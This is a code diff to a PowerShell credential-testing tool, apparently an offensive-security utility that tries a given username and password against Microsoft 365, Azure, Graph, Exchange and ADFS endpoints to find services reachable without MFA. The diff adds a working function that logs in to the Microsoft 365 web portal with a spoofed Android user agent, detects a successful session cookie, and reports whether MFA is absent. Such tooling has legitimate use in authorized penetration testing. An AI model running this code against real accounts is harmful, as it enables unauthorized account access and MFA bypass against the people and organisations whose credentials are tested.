@@ -1,4 +1,4 @@
-﻿Function Invoke-MFASweep{
+Function Invoke-MFASweep{
 
 <#
   
@@ -12,7 +12,7 @@
     Optional Dependencies: None
   
     .DESCRIPTION
-    This script attempts to login to various Microsoft services using a provided set of credentials. It will attempt to identify where authentication was successful and in some cases where MFA is enabled. By default this script will attempt to login to the Microsoft Graph API, Azure Service Management API, Microsoft 365 Exchange Web Services, Microsoft 365 Web Portal, and Microsoft 365 Active Sync. It also has an additional check for ADFS configurations and can attempt to login to the on-prem ADFS server if detected.
+    This script attempts to login to various Microsoft services using a provided set of credentials. It will attempt to identify where authentication was successful and in some cases where MFA is enabled. By default this script will attempt to login to the Microsoft Graph API, Azure Service Management API, Microsoft 365 Exchange Web Services, Microsoft 365 Web Portal with both desktop and mobile user agents, and Microsoft 365 Active Sync. It also has an additional check for ADFS configurations and can attempt to login to the on-prem ADFS server if detected.
       
     .PARAMETER Username
     Email Address to use during Authentication
@@ -31,7 +31,7 @@
     
     Description
     -----------
-    This command will use the provided credentials and attempt to authenticate to the Microsoft Graph API, Azure Service Management API, Microsoft 365 Exchange Web Services, Microsoft 365 Web Portal, and Microsoft 365 Active Sync. Prompts for performing recon and authenticating to ADFS will be displayed.
+    This command will use the provided credentials and attempt to authenticate to the Microsoft Graph API, Azure Service Management API, Microsoft 365 Exchange Web Services, Microsoft 365 Web Portal with both desktop and mobile user agents, and Microsoft 365 Active Sync. Prompts for performing recon and authenticating to ADFS will be displayed.
   
     .EXAMPLE
     C:\PS> Invoke-MFASweep -Username targetuser@targetdomain.com -Password Winter2020 -Recon -IncludeADFS
@@ -141,7 +141,7 @@
 
 
     $title = "Confirm MFA Sweep"
-    $message = "[*] WARNING: This script is about to attempt logging into the $username account FIVE (5) different times (6 if you included ADFS). If you entered an incorrect password this may lock the account out. Are you sure you want to continue?"
+    $message = "[*] WARNING: This script is about to attempt logging into the $username account SIX (6) different times (7 if you included ADFS). If you entered an incorrect password this may lock the account out. Are you sure you want to continue?"
 
     $yes = New-Object System.Management.Automation.Host.ChoiceDescription "&Yes", `
         "Attempts to authenticate 5 times to different Microsoft services."
@@ -164,6 +164,7 @@
     Invoke-AzureManagementAPIAuth -Username $Username -Password $Password
     Invoke-EWSAuth -Username $Username -Password $Password
     Invoke-O365WebPortalAuth -Username $Username -Password $Password
+    Invoke-O365WebPortalAuthMobile -Username $Username -Password $Password
     Invoke-O365ActiveSyncAuth -Username $Username -Password $Password
 
     If($IncludeADFS){
@@ -374,6 +375,111 @@ Function Invoke-O365WebPortalAuth{
     Write-Host -ForegroundColor red "[*] Login appears to have failed."
     }
 }
+
+
+Function Invoke-O365WebPortalAuthMobile{
+
+    Param(
+
+    [Parameter(Position = 0, Mandatory = $True)]
+    [string]
+    $Username = "",
+
+    [Parameter(Position = 1, Mandatory = $True)]
+    [system.URI]
+    $Password = ""
+    
+    )
+    
+    Write-Host `r`n
+    Write-Host "---------------- Microsoft 365 Web Portal w/ Mobile User Agent (Android) ----------------"
+  
+
+    Write-Host -ForegroundColor Yellow "[*] Authenticating to Microsoft 365 Web Portal using a mobile user agent..."
+
+    $SessionRequest = Invoke-WebRequest -Uri 'https://outlook.office365.com' -SessionVariable o365 -UserAgent "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Mobile Safari/537.36"
+
+    $partialctx = [regex]::Matches($SessionRequest.Content, 'urlLogin":".*?"').Value
+    $ctx = [regex]::Matches($partialctx, 'ctx=.*?"').Value -replace 'ctx=' -replace '"'
+    $FlowToken = [regex]::Matches($SessionRequest.Content, 'sFT":".*?"').Value -replace 'sFT":"' -replace '"'
+
+
+    $Userform = @{
+        username = "$username";
+        isOtherIdpSupported = "false";
+        checkPhones = "false";
+        isRemoteNGCSupported = "true";
+        isCookieBannerShown = "false";
+        isFidoSupported = "true";
+        originalRequest = "$ctx";
+        country = "US"; 
+        forceotclogin = "false";
+        isExternalFederationDisallowed = "false";
+        isRemoteConnectSupported = "false";
+        federationFlags = "0";
+        isSignup = "false";
+        flowToken = "$FlowToken";
+        isAccessPassSupported = "true"
+
+    }
+
+    $JSONForm = $Userform | ConvertTo-Json
+    
+    $UserNameRequest = Invoke-WebRequest -Uri ("https://login.microsoftonline.com/common/GetCredentialType?mkt=en-US") -WebSession $o365 -Method POST -Body $JSONForm -UserAgent "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Mobile Safari/537.36"
+
+
+    $AuthBody = @{i13='0';
+    login=$username;
+    loginfmt=$username;
+    type='11';
+    LoginOptions='3';
+    lrt='';
+    lrtPartition='';
+    hisRegion='';
+    hisScaleUnit='';
+    passwd=$password;
+    ps='2';
+    psRNGCDefaultType='';
+    psRNGCEntropy='';
+    psRNGCSLK='';
+    canary='';
+    ctx=$ctx;
+    hpgrequestid='';
+    flowToken=$FlowToken;
+    NewUser='1';
+    FoundMSAs='';
+    fspost='0';
+    i21='0';
+    CookieDisclosure='0';
+    IsFidoSupported='1';
+    isSignupPost='0';
+    i2='1';
+    i17='';
+    i18='';
+    i19='198733';
+    }
+
+    $AuthRequest = Invoke-WebRequest -Uri ("https://login.microsoftonline.com/common/login") -WebSession $o365 -Method POST -Body $AuthBody -UserAgent "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Mobile Safari/537.36"
+
+
+    if ($o365.Cookies.GetCookies("https://login.microsoftonline.com").Name -like "ESTSAUTH")
+    {
+    Write-Host -ForegroundColor Green "[*] SUCCESS! $username was able to authenticate to the Microsoft 365 Web Portal. Checking MFA now..."
+        if ($AuthRequest.Content -match "Stay signed in"){
+        Write-Host -ForegroundColor Cyan "[**] It appears there is no MFA for this account." 
+        Write-Host -ForegroundColor DarkGreen "[***] NOTE: Login with a web browser to https://outlook.office365.com using a mobile user agent." 
+        Foreach ($cookie in $o365.Cookies.GetCookies("https://login.microsoftonline.com")){write-verbose ($cookie.name + " = " + $cookie.value)}
+        }
+        elseif ($AuthRequest.Content -match "Verify your identity"){
+        Write-Host -ForegroundColor Red "[**] It appears MFA is setup for this account to access Microsoft 365 via the web portal." 
+        Foreach ($cookie in $o365.Cookies.GetCookies("https://login.microsoftonline.com")){write-verbose ($cookie.name + " = " + $cookie.value)}
+        }
+    }
+    else{
+    Write-Host -ForegroundColor red "[*] Login appears to have failed."
+    }
+}
+
 
 
 Function Invoke-GraphAPIAuth{
